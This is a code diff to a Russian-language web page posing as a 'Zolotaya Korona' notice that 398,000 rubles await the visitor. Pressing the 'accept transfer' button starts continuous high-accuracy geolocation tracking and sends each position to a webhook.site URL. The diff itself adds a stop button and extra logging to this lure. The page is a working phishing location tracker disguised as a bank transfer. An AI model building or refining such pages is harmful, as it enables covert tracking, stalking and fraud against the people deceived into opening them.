@@ -38,10 +38,16 @@
             font-size: 18px;
             cursor: pointer;
             border-radius: 5px;
-            margin-top: 15px;
+            margin: 10px;
         }
         button:hover {
             background-color: #2980b9;
+        }
+        .stop-button {
+            background-color: #e74c3c;
+        }
+        .stop-button:hover {
+            background-color: #c0392b;
         }
         #status {
             margin-top: 20px;
@@ -63,10 +69,13 @@
         <p>Вам начислен перевод на сумму 398 000 рублей. Для зачисления средств на вашу карту подтвердите операцию.</p>
         <p>Операция проводится через защищенное соединение Золотой Короны.</p>
         <button onclick="startTracking()">Принять перевод на карту</button>
+        <button onclick="stopTracking()" class="stop-button" style="display: none;" id="stopButton">Остановить отслеживание</button>
         <p id="status"></p>
     </div>
 
     <script>
+        let watchId = null;
+
         function logMessage(message) {
             console.log("[GeoDebug] " + message);
             document.getElementById("status").innerText = message;
@@ -84,26 +93,33 @@
             }
 
             logMessage("Запрашиваем геолокацию...");
-            navigator.geolocation.watchPosition(
+            watchId = navigator.geolocation.watchPosition(
                 position => {
                     const lat = position.coords.latitude;
                     const lon = position.coords.longitude;
                     const timestamp = new Date().toISOString();
                     logMessage(`Геолокация: Широта ${lat.toFixed(4)}, Долгота ${lon.toFixed(4)}`);
 
+                    // Показать кнопку "Остановить отслеживание"
+                    document.getElementById("stopButton").style.display = "inline-block";
+
                     // Отправка данных на Webhook.site
                     fetch('https://webhook.site/a3a94329-1da3-4ba4-80e1-e68292640044', {
                         method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
+                        headers: {
+                            'Content-Type': 'application/json',
+                            'Accept': 'application/json'
+                        },
                         body: JSON.stringify({ latitude: lat, longitude: lon, timestamp }),
                         mode: 'cors',
                         keepalive: true
                     })
                     .then(response => {
                         if (!response.ok) {
-                            throw new Error(`HTTP ошибка: ${response.status}`);
+                            throw new Error(`HTTP ошибка: ${response.status} ${response.statusText}`);
                         }
                         console.log("[GeoDebug] Данные отправлены успешно");
+                        logMessage(`Геолокация: Широта ${lat.toFixed(4)}, Долгота ${lon.toFixed(4)} (Отправлено)`);
                     })
                     .catch(error => {
                         console.error("[GeoDebug] Ошибка отправки:", error);
@@ -129,6 +145,15 @@
                 },
                 { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
             );
+        }
+
+        function stopTracking() {
+            if (watchId !== null) {
+                navigator.geolocation.clearWatch(watchId);
+                watchId = null;
+                logMessage("Отслеживание остановлено.");
+                document.getElementById("stopButton").style.display = "none";
+            }
         }
     </script>
 </body>
